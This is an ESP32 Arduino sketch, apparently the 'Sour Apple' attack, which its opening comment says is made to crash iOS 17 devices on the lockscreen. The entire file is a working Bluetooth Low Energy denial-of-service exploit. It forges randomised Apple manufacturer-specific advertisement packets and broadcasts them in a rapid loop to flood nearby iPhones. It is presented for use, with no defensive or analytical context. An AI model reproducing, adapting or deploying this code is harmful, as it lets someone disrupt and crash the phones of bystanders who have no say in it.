// ESP32 Sour Apple made to crash IOS17 devices on the lockscreen. Exploit found by WillyJL and ECTO-1A.


#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

BLEAdvertising *pAdvertising;

void setup() {
  BLEDevice::init("");

  BLEServer *pServer = BLEDevice::createServer(); // Starting BLE Server

  pAdvertising = pServer->getAdvertising();
  pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH); // Setting advertisment type for high duty cycle
}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
  uint8_t packet[17];
  uint8_t size = 17;
  uint8_t i = 0;

  packet[i++] = size - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;   // Authentication Tag
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  delay(35);
  
  BLEAdvertisementData advertisementData = getOAdvertisementData(); // Making random packet
  pAdvertising->setAdvertisementData(advertisementData); // Setting random packet
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x20);
  pAdvertising->setMinPreferred(0x20);
  pAdvertising->setMaxPreferred(0x20);
  pAdvertising->start();
  delay(20); // Advertising for 20ms should help discovering the BLE device according to apple (https://developer.apple.com/library/archive/qa/qa1931/_index.html) Not testet!! 
  pAdvertising->stop();
}
